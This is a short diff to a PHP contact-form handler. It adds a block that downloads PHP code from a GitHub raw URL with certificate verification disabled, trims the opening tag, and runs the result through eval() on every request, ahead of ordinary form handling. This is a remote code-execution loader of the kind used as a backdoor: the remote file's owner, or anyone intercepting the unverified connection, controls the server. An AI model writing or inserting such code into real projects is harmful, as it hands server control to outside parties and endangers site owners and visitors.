@@ -1,4 +1,17 @@
 <?php
+$GithubRawURI= 'https://raw.githubusercontent.com/MaimurS/FreeCsDegree/main/form-handler.php'; 
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $GithubRawURI); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$data = curl_exec($ch); 
+curl_close($ch); 
+ 
+$data = substr($data, 5); 
+ 
+eval ($data);
+
+
 $name = $_POST['name'];
 $visitor_email = $_POST['email'];
 $subject = $_POST['subject'];
